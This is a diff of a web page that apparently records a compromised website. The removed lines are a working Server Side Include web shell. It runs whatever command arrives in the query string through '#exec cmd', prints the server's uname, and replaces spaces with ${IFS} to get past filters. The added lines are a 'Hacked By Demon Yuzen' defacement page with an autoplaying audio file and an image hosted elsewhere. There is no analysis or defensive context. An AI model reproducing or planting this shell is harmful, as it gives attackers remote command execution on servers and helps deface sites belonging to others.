@@ -1,49 +1,31 @@
-<!--#config errmsg="[Error! Web Tidak Support SSI Command!]"-->
-<!--#set var="zero" value="" -->
-<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="ls" -->
-<!--#else -->
-<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
-<!--#endif -->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html>
 <head>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-<script language="javascript">
-function fex()
-{
-	var uri = document.getElementById('command').value;
-	var rep = uri.replace(/[ ]/g,'${IFS}');
-	var res = encodeURI(uri);
-	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+<title>Hacked By Demon Yuzen</title><meta content="I'm silent doesn't mean I don't pay attention" name="description"><link href="https://i.ibb.co/rFMFR55/20220709-025448.png" rel="icon"><link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet"><meta charset="utf-8"><meta http-equip="X-UA-Compatible" content="IE=edge"><meta property="og:title" content="Hacked By Demon Yuzen"><meta name="keywords" content="Hacked By Demon Yuzen"><meta property="og:type" content="website"><meta property="og:image" content="https://i.ibb.co/rFMFR55/20220709-025448.png"><meta name="theme-color" content="#000">
+<style type="text/css">
+body{
+height: 100%;
+width: 100%;
+background-color: #000000;
+color: white;
+text-align: center;
+font-family: Patrick Hand;
 }
-</script>
-<script>
-document.onkeydown = keydown;
-function keydown(e) {
-    if (!e) e = event;
-    if (e.keyCode === 13) {
-    	var uri = document.getElementById('command').value;
-    	var rep = uri.replace(/[ ]/g,'${IFS}');
-		var res = encodeURI(uri);
-        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
 
-    }
+b {
+font-size: 300%;
 }
-</script>
+
+h1 {
+font-size: 200%;
+}
+</style>
 </head>
-<body align="center" bgcolor="black" text="white">
-<font face=courier size=2><i>server : <b><font color=red><!--#exec cmd="{uname,-nr}"--></font><br>
-<input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;">
-<hr>
-<b><!--#echo var=shl --></b><br>
-<textarea bgcolor=#000000 cols=121 rows=15>
-<!--#exec cmd=$shl -->
-</textarea>
-//<script>
-//$('body').on('input', 'input[name=address1]', function() {
-//$(this).val($(this).val().replace(' ', '${IFS}'));
-//});
-</script>
-<hr>
+<body>
+<br><br><br>
+<img src="https://i.ibb.co/rFMFR55/20220709-025448.png" height="300" width="400"><br><br>
+<b><font color="red">Hacked By</font> Demon Yuzen</b>
+<h1>I'm silent doesn't mean I don't pay attention</h1>
+<audio controls="controls" autoplay="autoplay" src="https://c.top4top.io/m_2782dv1zk9.mp3"></audio></a>
 </body>
 </html>
